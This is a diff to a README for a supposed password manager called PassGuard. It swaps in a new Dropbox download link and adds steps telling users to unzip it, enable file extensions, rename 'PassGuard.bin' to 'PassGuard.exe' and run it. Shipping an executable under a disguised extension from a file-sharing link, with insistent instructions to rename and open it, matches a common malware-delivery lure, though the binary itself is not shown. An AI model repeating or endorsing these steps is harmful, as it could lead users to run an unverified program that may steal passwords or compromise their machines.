@@ -7,7 +7,28 @@ No need to login or sign up for this,
 ![image](https://github.com/user-attachments/assets/33c6dcd1-ba61-489f-832a-a72c8a75ad78)
 and then click on " or continue with download only " without signing up or login
 
-[Download File](https://www.dropbox.com/scl/fi/ckr7y51w78dep2hle2bki/passguard.zip?rlkey=ctv0ukfxnvpbwq3t3s37ju9vv&st=rj3mvv6y&dl=0)
+BUT AFTER DOWNLOADING U NEED TO :
+1) Unzip the dist folder
+2) open the dist/passguards and u will find "PassGuard.bin" which is the actual program u need to open
+3) but before opening u need to first do certain things
+STEP 1 -
+Enable File Extensions (if needed):
+
+Open File Explorer.
+Go to the View tab.
+Check the box for File name extensions. ( THIS WILL ALLOW U TO RENAME THE PROGRAM FROM .BIN TO .EXE FOR PROPER USE)
+
+STEP 2 - Rename via Right-Click
+Right-Click and Rename:
+
+Navigate to your dist folder.
+Right-click on PassGuard.bin
+Select Rename.
+Change the name to PassGuard.exe
+Important:FOLLOW THIS STEP ELSE UR PROGRAM WONT WORK)
+after step 2 just open the renamed program and enjoy the benefits!!
+
+[Download File](https://www.dropbox.com/scl/fi/gm1t6rx1thx1dluc1uhts/dist.zip?rlkey=kkearqc8nrnyfa229e4xwwvc6&st=pepp6r8z&dl=0)
 
 Features:
 Secure Storage: Easily add, edit, and delete passwords.
